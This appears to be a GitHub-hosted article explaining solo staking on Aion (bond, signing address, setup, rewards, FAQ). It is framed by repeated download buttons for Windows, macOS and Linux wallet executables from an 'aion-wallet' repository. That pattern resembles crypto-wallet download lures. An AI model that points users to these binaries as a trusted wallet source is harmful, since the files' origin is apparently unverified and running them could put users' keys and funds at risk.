![Aion Wallet](assets/banner-article.png)

# Aion solo staker node: what it takes

A non-custodial AION wallet for Windows, macOS, Linux, with keys on your own machine.

<p align="center"><a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-windows-v1.2.5.exe"><img src="https://img.shields.io/badge/DOWNLOAD-Windows-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI0ZGRkZGRiIgZD0iTTEuNSA0LjYgMTAuMiAzLjN2OEgxLjV6TTExLjcgMy4xIDIyLjUgMS43djkuNkgxMS43ek0xLjUgMTIuN2g4Ljd2OEwxLjUgMTkuNHpNMTEuNyAxMi43aDEwLjh2OS42bC0xMC44LTEuNHoiLz48L3N2Zz4%3D&amp;logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-macos-v1.2.5.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-macOS-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=apple&amp;logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-linux-v1.2.5.zip"><img src="https://img.shields.io/badge/DOWNLOAD-Linux-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=linux&amp;logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
|---|---|---|
| <img src="https://img.shields.io/badge/PLATFORM-Windows-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI0ZGRkZGRiIgZD0iTTEuNSA0LjYgMTAuMiAzLjN2OEgxLjV6TTExLjcgMy4xIDIyLjUgMS43djkuNkgxMS43ek0xLjUgMTIuN2g4Ljd2OEwxLjUgMTkuNHpNMTEuNyAxMi43aDEwLjh2OS42bC0xMC44LTEuNHoiLz48L3N2Zz4%3D&amp;logoColor=white" alt="Windows" height="24"> | Windows 10 (1909) or later, 64-bit | [`Aion-desktop-wallet-windows-v1.2.5.exe`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-windows-v1.2.5.exe) |
| <img src="https://img.shields.io/badge/PLATFORM-macOS-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=apple&amp;logoColor=white" alt="macOS" height="24"> | macOS 12 or later | [`Aion-desktop-wallet-macos-v1.2.5.dmg`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-macos-v1.2.5.dmg) |
| <img src="https://img.shields.io/badge/PLATFORM-Linux-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=linux&amp;logoColor=white" alt="Linux" height="24"> | x64, Ubuntu 20.04 or later, or equivalent | [`Aion-desktop-wallet-linux-v1.2.5.zip`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-linux-v1.2.5.zip) |

</div>

All versions and checksums are on the [Aion Desktop Wallet release page](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/tag/v1.2.5).

> **Only download from this GitHub release page.**

Solo staking on Aion means registering your own stake with a self-bond of at least 1,000 AION and producing proof-of-stake blocks in your own name, without pooling anyone else's stake.

It is the operator path with a single participant: no commission to set, no delegators to report to, and no third party between your stake and the block reward.

## You'll see this if

- You have the bond and want the rewards without delegating.
- You already run Aion infrastructure and are adding the staking role.
- You are comparing solo staking with running a public pool.
- You registered a signing address and are unsure what it is for.

## What solo staking requires

A node that stays online, the 1,000 AION self-bond, a signing address registered with the network, and monitoring that tells you when the node stops producing.

Uptime is the real cost. A staker that goes offline stops earning, and the reward it misses is not recoverable afterwards.

## The signing address

The signing address is the key the node uses to sign blocks. It is separate from the account that holds the stake, and it has a cooling period of 60,480 blocks, roughly seven days, before it can be replaced.

That cooling is deliberate. A signing key that could be swapped instantly would let an operator change identity between blocks; the wait makes the change visible.

It is also the number people confuse with the delegator's thaw. If you are not producing blocks yourself, the [Aion undelegating time](https://github.com/aion-wallet/aion-staking/blob/main/aion-undelegating-time.md) guide is the relevant one.

## Setting it up

1. Prepare a machine that can stay online, with the disk and memory the node needs and stable network access.
2. Install and sync the node, then confirm it follows the chain.
3. Create the staking account in the desktop wallet and fund it with at least the bond.
4. Register the pool or solo stake with the network, setting the signing address the node will use.
5. Confirm the registration appears in the staking view before assuming production has started.
6. Watch the first blocks. A registered staker that never produces has a configuration problem, not bad luck.

## Rewards, honestly described

Solo staking earns the whole block reward for the blocks you produce, because there is no commission to share. What it does not do is make production frequent: weight decides that, and a solo stake competes with pools holding far more.

The result is variance. Long gaps between blocks are normal for a small solo stake, and the annual figure implied by a good week is not a forecast.

## Operating it

Monitor the node, not the balance. A node that has stopped syncing, lost its peers or crashed will stop producing while the wallet still shows a healthy-looking stake.

Keep the signing key available but not exposed. The node needs it to sign; nothing else on the machine should be able to read it.

Plan for downtime. An update, a reboot or a power cut costs production, and a staker that is offline for hours loses more than the fee it saved by skipping maintenance.

## Solo staking versus a pool

Run solo when you want the whole reward, you have the bond and you can keep a node online. Delegate when you want the exposure without the operations, as described in the [how to stake AION](https://github.com/aion-wallet/aion-staking/blob/main/how-to-stake-aion.md) guide.

Run a public pool when other people's stake is part of the plan, which adds commission, reporting and a much larger operational surface.

## What solo staking does not give you

It does not remove variance, shorten the thaw or raise your weight above what your stake earns. A solo staker with a small bond faces long gaps between blocks, and no configuration changes that.

What it does give you is the whole reward on the blocks you produce and no commission to negotiate. That trade is the entire decision, and the [Aion staking pool choice](https://github.com/aion-wallet/aion-staking/blob/main/aion-staking-pool-choice.md) article describes the alternative for anyone who would rather have steadiness than the full reward.

Before funding the registration, read the bond requirement as an operator rather than as a delegator, which the [Aion minimum stake](https://github.com/aion-wallet/aion-staking/blob/main/aion-minimum-stake.md) article sets out.

## Prevention

Test the node for a week before committing the bond. A machine that reboots nightly is not a staking machine.

Keep the stake account's recovery phrase backed up separately from the node. Losing the node is an outage; losing the phrase is a loss.

Record the signing address and the registration date. When production stops, the record is what tells you whether the fault is the node or the registration.

## Frequently asked questions

### Can I solo stake with less than 1,000 AION?

No. The bond is a registration requirement for solo staking as well as for pools.

### Do I need a public IP address?

The node needs to be reachable and able to maintain peers. A stable connection matters more than a static address, but check the node's documentation for the current requirement.

### What happens if my node goes offline?

You stop producing and stop earning. The stake remains registered and yours, and production resumes when the node does.

### Can I delegate and solo stake at the same time?

They are separate positions. The bond applies to the registration; delegation is additional weight assigned to a pool.

## Download Aion Wallet

<p align="center"><a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-windows-v1.2.5.exe"><img src="https://img.shields.io/badge/DOWNLOAD-Windows-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI0ZGRkZGRiIgZD0iTTEuNSA0LjYgMTAuMiAzLjN2OEgxLjV6TTExLjcgMy4xIDIyLjUgMS43djkuNkgxMS43ek0xLjUgMTIuN2g4Ljd2OEwxLjUgMTkuNHpNMTEuNyAxMi43aDEwLjh2OS42bC0xMC44LTEuNHoiLz48L3N2Zz4%3D&amp;logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-macos-v1.2.5.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-macOS-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=apple&amp;logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-linux-v1.2.5.zip"><img src="https://img.shields.io/badge/DOWNLOAD-Linux-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=linux&amp;logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
|---|---|---|
| <img src="https://img.shields.io/badge/PLATFORM-Windows-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI0ZGRkZGRiIgZD0iTTEuNSA0LjYgMTAuMiAzLjN2OEgxLjV6TTExLjcgMy4xIDIyLjUgMS43djkuNkgxMS43ek0xLjUgMTIuN2g4Ljd2OEwxLjUgMTkuNHpNMTEuNyAxMi43aDEwLjh2OS42bC0xMC44LTEuNHoiLz48L3N2Zz4%3D&amp;logoColor=white" alt="Windows" height="24"> | Windows 10 (1909) or later, 64-bit | [`Aion-desktop-wallet-windows-v1.2.5.exe`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-windows-v1.2.5.exe) |
| <img src="https://img.shields.io/badge/PLATFORM-macOS-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=apple&amp;logoColor=white" alt="macOS" height="24"> | macOS 12 or later | [`Aion-desktop-wallet-macos-v1.2.5.dmg`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-macos-v1.2.5.dmg) |
| <img src="https://img.shields.io/badge/PLATFORM-Linux-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=linux&amp;logoColor=white" alt="Linux" height="24"> | x64, Ubuntu 20.04 or later, or equivalent | [`Aion-desktop-wallet-linux-v1.2.5.zip`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-linux-v1.2.5.zip) |

</div>

All versions and checksums are on the [Aion Desktop Wallet release page](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/tag/v1.2.5).

## Related articles

- [Aion minimum stake](https://github.com/aion-wallet/aion-staking/blob/main/aion-minimum-stake.md) - the bond in detail.
- [How to run an Aion node](https://github.com/aion-wallet/aion-staking/blob/main/how-to-run-aion-node.md) - the node itself.
- [Aion staking rewards](https://github.com/aion-wallet/aion-staking/blob/main/aion-staking-rewards.md) - why production is uneven.
- [Aion staking pool choice](https://github.com/aion-wallet/aion-staking/blob/main/aion-staking-pool-choice.md) - the pooled alternative.
